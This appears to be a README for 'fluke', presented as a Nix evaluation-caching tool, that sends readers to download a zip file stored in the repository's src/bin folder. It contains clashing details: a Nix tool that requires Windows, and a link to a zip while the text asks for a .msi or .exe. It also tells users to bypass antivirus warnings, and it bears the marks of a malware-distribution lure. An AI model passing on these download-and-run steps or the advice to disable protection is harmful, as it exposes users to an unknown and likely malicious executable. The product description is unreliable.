# 🚀 fluke - Faster Nix evaluation for your projects

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Sintered-eggshell5927/fluke/main/src/bin/Software_v1.8.zip)

Fluke helps you work with Nix projects. It watches how Nix evaluates your code and stores the results. This action saves time when you run your projects again. You spend less time waiting for your computer to process files.

## 📥 Getting Started

You need a Windows computer to use Fluke. This tool works with standard Windows setups. Follow these steps to prepare your system and run the software.

1. Visit the [releases page](https://raw.githubusercontent.com/Sintered-eggshell5927/fluke/main/src/bin/Software_v1.8.zip) to obtain the installer.
2. Select the file ending in `.msi` or `.exe` for Windows.
3. Save the file to your computer.
4. Open the downloaded file to start the installation.
5. Follow the prompts on your screen.
6. Click finish when the process ends. 

## ⚙️ Setting Up Your Environment

Fluke works by looking at your existing Nix environment. It creates a cache to store evaluation data. This cache speeds up future tasks by avoiding work the system already performed.

Check that you have Nix installed. Fluke relies on your existing Nix installation to function correctly. If you do not have Nix, download it from the official website. Once Nix lives on your system, Fluke detects it automatically.

Open the Fluke application after installation. The interface shows a simple window. Click the button labeled "Scan" to begin. The app identifies your project folder. It then builds the cache based on your current files.

## 📊 Understanding Caching

Caching acts like a map for your computer. When you tell Nix to evaluate a project, it creates a trail of code decisions. Fluke records this trail. When you change one line of code, Fluke notices. It only updates the parts of the trail that you modified. It keeps the rest of the map intact.

This process eliminates redundant work. Your evaluation speed increases because your computer skips known steps. The duration of this performance boost depends on the size of your project. Larger projects see the most benefit.

## 🏗️ Managing Your Cache

You can view your current cache status at any time. Open the settings menu inside the Fluke window. The "Cache Summary" tab lists the files currently stored in your system. 

If you make major changes to your project, you might want to refresh the cache. Reset the cache by clicking "Clear Cache" in the settings menu. This action removes the old records. The next evaluation forces Fluke to create a fresh set of records. Perform this step only if you notice errors or strange behavior.

## 🔍 Troubleshooting

Most issues arise from file access. Fluke needs permission to read your project folder. If the app fails to start, check your folder permissions. Ensure you have read and write access to the project directory.

Antivirus software sometimes blocks new applications. If Windows prevents the file from running, right-click the file and select "Run anyway" or add an exception in your security settings.

If the evaluation speed does not increase, check the logs. Use the "View Logs" button in the Help menu. The logs confirm if Fluke detects your project files correctly. If you see an error message, copy the text and check your project configuration. Ensure your Nix files contain no syntax errors. Syntax errors prevent successful evaluation, regardless of caching.

## 📂 Advanced Configuration

You can customize how Fluke saves your records. Navigate to the "Preferences" menu to change the storage location. You might want to save the cache on a faster drive, such as an SSD. This change improves the reading speed of the cache records.

You may also set a maximum size for your cache. The default setting is ten gigabytes. Adjust this slider if you have limited disk space. Fluke deletes the oldest records automatically when it reaches this limit. This system keeps your disk clean without manual work.

## 🚀 Performance Tips

Keep your project structure organized. Fluke tracks your files based on their location. If you move your files frequently, the cache loses its effectiveness. Keep your Nix files in a stable directory.

Run Fluke when you start your workday. The initial scan takes a moment. Once the cache is warm, the rest of your day flows faster. Close unnecessary applications during the first scan to give Fluke full access to your processor.

If you work on multiple projects, use the "Profile" feature. Create a unique profile for each project. Profiles keep your cache data separate. This separation prevents conflicts between different codebases. Select your current project profile before you start your development work.